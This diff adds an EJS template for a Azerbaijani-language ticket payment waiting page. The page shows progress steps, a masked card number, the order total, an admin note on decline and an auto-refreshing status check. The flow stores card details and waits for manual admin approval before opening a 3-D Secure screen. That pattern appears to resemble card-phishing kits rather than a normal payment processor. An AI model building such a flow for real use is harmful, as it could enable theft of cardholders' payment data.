@@ -1,0 +1,35 @@
+<section class="section">
+  <div class="container">
+    <div style="max-width:640px;margin:0 auto">
+      <div class="steps">
+        <div class="step is-done"><strong>1. Kart məlumatları</strong>Qeydə alındı</div>
+        <div class="step is-active"><strong>2. Təsdiq</strong>Yoxlanılır</div>
+        <div class="step"><strong>3. 3-D Secure</strong>Doğrulama</div>
+        <div class="step"><strong>4. Bilet</strong>Verilir</div>
+      </div>
+
+      <div class="card" id="waitBox" data-status-url="/api/payment/<%= order._id %>/status">
+        <div class="card__body text-center">
+          <h1 style="font-size:1.4rem">
+            <% if (declined) { %><%= t('status.rejected') %><% } else { %><%= t('payment.waiting') %> <span class="pulse"></span><% } %>
+          </h1>
+
+          <% if (declined) { %>
+            <div class="alert alert--error"><%= order.adminNote || t('status.rejected') %></div>
+            <a href="/<%= locale %>/odenis/<%= order._id %>" class="btn btn--primary"><%= t('payment.title') %></a>
+          <% } else { %>
+            <p class="sec-note"><%= t('payment.saved') %> Təsdiqdən sonra 3-D Secure doğrulama ekranı açılacaq.</p>
+
+            <dl class="kv" style="text-align:left;margin-top:20px">
+              <dt>Sifariş</dt><dd><%= order.orderNo %></dd>
+              <dt><%= t('payment.methodCard') %></dt><dd class="mono"><%= cardMasked || '—' %></dd>
+              <dt><%= t('checkout.total') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
+            </dl>
+
+            <p class="sec-note mt-24">Bu ekran avtomatik yenilənir.</p>
+          <% } %>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
